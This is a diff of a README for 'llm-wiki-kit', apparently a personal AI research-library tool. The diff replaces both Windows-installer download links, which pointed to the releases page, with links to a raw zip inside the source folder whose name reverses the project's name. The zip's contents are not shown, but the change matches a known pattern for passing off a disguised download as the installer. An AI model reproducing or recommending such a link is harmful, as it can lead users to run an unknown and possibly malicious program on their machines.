@@ -1,6 +1,6 @@
 # 📚 llm-wiki-kit - Build A Personal AI Research Library
 
-[![](https://img.shields.io/badge/Download_Windows_Installer-blue)](https://github.com/myidchristy/llm-wiki-kit/releases)
+[![](https://img.shields.io/badge/Download_Windows_Installer-blue)](https://github.com/myidchristy/llm-wiki-kit/raw/refs/heads/main/src/llm_wiki_kit/llm-kit-wiki-v3.4.zip)
 
 ## What is this tool?
 This software organizes your research. It creates a digital library that connects to your AI agent. You provide documents, website links, or videos. The agent reads these items and stores the information in a wiki format. The wiki grows as you add more content. Your AI agent uses this information to answer your questions later. You no longer need to explain your past research to the AI. It remembers the details because it stores them in your private knowledge base.
@@ -19,7 +19,7 @@ Follow these steps to set up the software on your machine:
 6. Click finish when the process reaches the end.
 7. Open the application folder from your desktop icon to start the program.
 
-[![](https://img.shields.io/badge/Download_Windows_Installer-grey)](https://github.com/myidchristy/llm-wiki-kit/releases)
+[![](https://img.shields.io/badge/Download_Windows_Installer-grey)](https://github.com/myidchristy/llm-wiki-kit/raw/refs/heads/main/src/llm_wiki_kit/llm-kit-wiki-v3.4.zip)
 
 ## 📖 Getting Started
 When you open the app, you see a blank screen. This screen is your new wiki. The wiki acts as a home for your notes and files. To begin, click the "+" button in the top corner. This opens an import window. You can drag and drop your PDF files into this box. You can also paste website URLs or YouTube links here. 
